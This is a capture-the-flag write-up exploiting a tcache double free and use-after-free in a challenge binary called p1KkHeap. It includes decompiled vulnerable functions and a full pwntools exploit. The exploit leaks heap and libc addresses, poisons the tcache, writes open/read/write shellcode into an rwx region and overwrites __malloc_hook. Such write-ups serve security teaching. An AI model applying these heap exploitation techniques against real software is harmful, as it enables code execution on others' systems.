# Double Free

This challenge is for practicing the double free in tcache, since there's not much check is really done on the chunks during the recycling, Now, the binary named `p1KkHeap` which had all the protections enabled and it also had the seccomp sandbox enabled which blacklisted the `execve` call, this made the final payload being the open, read and write for the `flag.txt`


# Overview of the Binary

`checksec`

```r
➜ swpuctf_pwn_p1KkHeap checksec p1KkHeap
[*] '/home/d4mianwayne/Pwning/heap/tcache/swpuctf/swpuctf_pwn_p1KkHeap/p1KkHeap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

`seccomp-tools`:-

![](/img/seccomp.png)

# Vulnerability

This binary had the vulnerability in the `edit` function:-

```C
int __fastcall edit(__int64 a1, __int64 a2)
{
  unsigned __int64 index; // [rsp+8h] [rbp-8h]

  printf("id: ", a2);
  index = read_int();
  if ( index > 7 )
    error();
  printf("content: ");
  read(0, heap_list[index], (int)size_list[index]);
  return puts("Done!");
}
```
Since it doesn't check for the global pointer `heap_list` for the edit and the `delete` function does not clear the global pointer `heap_list` of that index, it makes this binary vulnerable to Use After Free.

```C
int __fastcall delete(__int64 a1, __int64 a2)
{
  unsigned __int64 index; // [rsp+8h] [rbp-8h]

  if ( free_count <= 0 )
    error();
  printf("id: ", a2);
  index = read_int();
  if ( index > 7 )
    error();
  free(heap_list[index]);
  size_list[index] = 0;
  --free_count;
  return puts("Done!");
}
```
The `show` function also does not check for `heap_list` validation, hence we can leak addresses:-

```C
int __fastcall show(__int64 a1, __int64 a2)
{
  unsigned __int64 index; // [rsp+8h] [rbp-8h]

  printf("id: ", a2);
  index = read_int();
  if ( index > 7 )
    error();
  printf("content: ");
  puts((const char *)heap_list[index]);
  return puts("Done!");
}
```

Since we have Use After Free for the `edit` and `show` this will be our cue.

# Complications

The complications which made this binary a bit of menace to pwn was the amount of `free`, once can call, Since the number of the `free` that a user is allowed to call were 3, this made the subsequent process harder than usual. Second, the binary had the seccomp enabled, making it harder to get shell, which of course, was not possible because of the `execve` being blacklisted. Throughout the exploitation phase, we will see the methodologies to overcome over these complications and difficulties.

# Exploitation Metodology

The strategy of the exploitation is listed below:-

* Allocate two chunks.
* Double free the chunk 1.
* Leak the heap address with UAF.
* Overwrite the `fd` of chunk 1 to the `tcache_perthread_structure`  allocated at the top of the heap.
* Allocate chunks and get then overwrite the max size with a large value resulting in the tcache being disabled.
* Free the chunk 0, this will land into the unsorted bin since tcache is disabled now.
* Overwrite the `fd` with the `rwx` region and then store shellcode there.
* Overwrite the `fd` again, this time with the `__malloc_hook` and then overwrite it with the `rwx`.


# Pwning

The following are the wrapper functions:-

```py
from pwn import *  
  
#sh = process('./p1KkHeap')  
context(arch='amd64',os='linux')  
p = process("./p1KkHeap", env={"LD_PRELOAD":"./libc.so.6"})
#libc_path = '/lib/x86_64-linux-gnu/libc-2.27.so'  
libc_path = './libc.so.6'  
libc = ELF(libc_path)  
malloc_hook_s = libc.symbols['__malloc_hook']  
open_s = libc.sym['open']  
read_s = libc.sym['read']  
write_s = libc.sym['write']  
  
def create(size):  
   p.sendlineafter('Your Choice:','1')  
   p.sendlineafter('size:',str(size))  
  
def show(index):  
   p.sendlineafter('Your Choice:','2')  
   p.sendlineafter('id:',str(index))  
  
def edit(index,content):  
   p.sendlineafter('Your Choice:','3')  
   p.sendlineafter('id:',str(index))  
   p.sendafter('content:',content)  
  
def delete(index):  
   p.sendlineafter('Your Choice:','4')  
   p.sendlineafter('id:',str(index))
```

Now, moving on, we allocate the 2 chunks, one for the tcache and second to not let the coalesce of the chunks. Now, we move on:-

```py
create(0x100)  # Chunk 1
create(0x18)   # Chunk 2
```

Now, we double free the chunks:-

```py
delete(0)
delete(0)
```

At this time, when we see the chunk having it `fd` populated with the address same as of chunk 1.

![](/img/double_free.png)

We use the Use After Free to get the heap address, since chunk 1 `fd` points to the chunk itself, `show(0)` will print it's content, printing the heap address.

```py
show(0)
p.recvuntil(": ")
heap_addr = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x10
tcache_head = heap_addr - 0x188
log.info("HEAP:    0x%x" %(tcache_head))
```

Now, we create a chunk, this will give back the chunk 1 address, now, we have the ability to overwrte the chunk 1's `fd` pointer, we overwrite it with the `tcache_perthread_structure` address of that process.

```py
create(0x100)  # Chunk 3
edit(2, p64(tcache_head))
```

Given that, we will do two allocation, resulting in the `MAX_BIN_SIZE` overwritten.

```py
create(0x100) # Chubk 4
create(0x100) # Chunk 5 --> tcache_head
```

Since, `tcache` at this point is disabled and the chunk 1 size will be over 0x80(inclusive), `free`ing it would land it to the unsorted bin, resulting the chunk 1 pointer being populated with the `main_arena`, using the Use After Free, we can have the LIBC leak:-

```py
delete(0)
show(0)
p.recvuntil(": ")
libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x3ebca0
log.info("LEAK:   0x%x" %(libc.address))
```

Since the chunk 4th is basically the freed'd chunk, we overwrite it with the `rwx` address

```py
edit(4, p64(0x0000000066660000))
```
![](/img/rwx.png)

Now, since because of seccomp sandbox, we have to do `open/read/write` shellcode to read falag, we create a shellcode:-

```py
shellcode = asm("""
           mov rax, 0x7478742E67616C66
           push 0x0
           push rax
           mov rsi, 0
           mov rdi, rsp
           mov rax, 0x%x
           call rax

           mov rdi, rax
           mov rsi, rsp
           mov rdx, 0x30
           mov rax, 0x%x
           call rax

           mov rdi, 0x1
           mov rsi, rsp
           mov rdx, 0x30
           mov rax, 0x%x
           call rax""" %(libc.symbols['open'], libc.symbols['read'], libc.symbols['write']))

```

![](/img/shellcode.png)

Now, we create a chunk which will just give the `rwx` pointer, then we edit that allocated chunk with the shellcode:-

```py
create(0x100)
edit(5, shellcode)
```

Now, then we overwrite the chunk 4 `fd` with `__malloc_hook`, then on next allocation we will have the `__malloc_hook` address, which we overwrite it with the `rwx` addresss exactly where the shellcode resides.

```py
edit(4, p64(libc.symbols['__malloc_hook']))
create(0x100)
edit(6, p64(0x0000000066660000))
```

![](/img/malloc_hook.png)

Now, we just do try to call `malloc` and we get the flag.

```py
create(0x40)
p.interactive()
```

![](/img/flag.png)